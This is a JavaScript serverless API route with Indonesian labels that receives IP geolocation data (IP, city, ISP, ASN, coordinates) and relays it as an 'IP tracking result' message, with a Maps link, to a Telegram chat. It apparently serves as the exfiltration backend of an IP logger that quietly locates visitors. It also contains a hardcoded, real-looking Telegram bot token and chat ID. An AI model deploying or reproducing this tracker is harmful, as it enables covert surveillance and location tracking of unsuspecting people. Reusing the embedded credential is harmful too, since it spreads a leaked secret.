export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const BOT_TOKEN = "8427844482:AAHHXCP_psaehlBnm8SHBEEFvhTehYw2gEY"; // Ganti dengan token bot Telegram kamu
  const CHAT_ID = "7600526426"; // Ganti dengan chat ID Telegram kamu

  try {
    const { data } = req.body;
    if (!data) return res.status(400).json({ error: "Data is required" });

    const message = `
🌐 <b>Hasil Pelacakan IP</b>

📍 IP: ${data.ip}
🌍 Negara: ${data.country_name}
🏙 Kota: ${data.city}, ${data.region}
🛰 ISP: ${data.org}
🏢 Org: ${data.org}
⚡ ASN: ${data.asn || "N/A"}
⌚ Zona Waktu: ${data.timezone}
📌 Koordinat: ${data.latitude}, ${data.longitude}

🔗 <a href="https://www.google.com/maps?q=${data.latitude},${data.longitude}">Lihat di Maps</a>
    `.trim();

    const telegramRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });

    const telegramResult = await telegramRes.json();

    if (!telegramRes.ok || !telegramResult.ok) {
      console.error("Telegram error:", telegramResult);
      return res.status(500).json({ error: "Failed to send message", detail: telegramResult });
    }

    return res.status(200).json({ ok: true, telegramResult });
  } catch (error) {
    console.error("API error:", error);
    return res.status(500).json({ error: error.message });
  }
                    }
